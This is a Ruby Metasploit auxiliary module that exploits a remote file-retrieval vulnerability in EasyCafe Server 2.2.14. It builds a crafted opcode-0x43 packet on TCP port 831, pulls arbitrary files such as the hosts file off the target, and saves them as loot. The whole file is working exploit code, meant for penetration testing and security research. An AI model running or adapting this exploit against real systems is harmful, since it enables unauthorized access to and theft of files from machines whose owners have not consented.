##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'EasyCafe Server Remote File Access',
      'Description' => %q{
          This module exploits a file retrieval vulnerability in
        EasyCafe Server. The vulnerability can be triggered by
        sending a specially crafted packet (opcode 0x43) to the
        831/TCP port.
        This module has been successfully tested on EasyCafe Server
        version 2.2.14 (Trial mode and Demo mode) on Windows XP SP3
        and Windows 7 SP1.
        Note that the server will throw a popup messagebox if the
        specified file does not exist.
      },
      'License'     => MSF_LICENSE,
      'Author'      =>
        [
          'R-73eN', # Vulnerability Discovery
          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit module
        ],
      'References'  =>
        [
          [ 'EDB', '39102' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(831),
        OptString.new('FILEPATH', [true, 'The path of the file to download', 'C:\\WINDOWS\\system32\\drivers\\etc\\hosts'])
      ])
  end

  def get_file
    res = sock.get_once
    unless res
      print_error("Unable to retrieve file due to a timeout.")
      return
    end

    unless res.length == 261
      print_error("Received a response of an invalid size.")
      return
    end

    file_size = res.unpack('@256V')[0]
    contents = ''
    while contents.length < file_size
      contents << sock.get_once
    end

    print_good("File retrieved successfully (#{contents.length} bytes)!")
    contents
  end

  def run_host(ip)
    file_path = datastore['FILEPATH']
    if file_path.length > 67
      print_error("File path is longer than 67 characters. Try using MS-DOS 8.3 short file names.")
      return
    end

    packet = "\x43"
    packet << file_path
    packet << "\x00" * (255 - file_path.length)
    packet << "\x01\x00\x00\x00\x01"

    vprint_status("Sending request (#{packet.length} bytes)")
    connect
    sock.put(packet)

    contents = get_file
    disconnect
    return if contents.nil?

    path = store_loot(
      'easycafe_server',
      'application/octet-stream',
      ip,
      contents,
      File.basename(file_path)
    )
    print_status("File saved in: #{path}")
  end
end
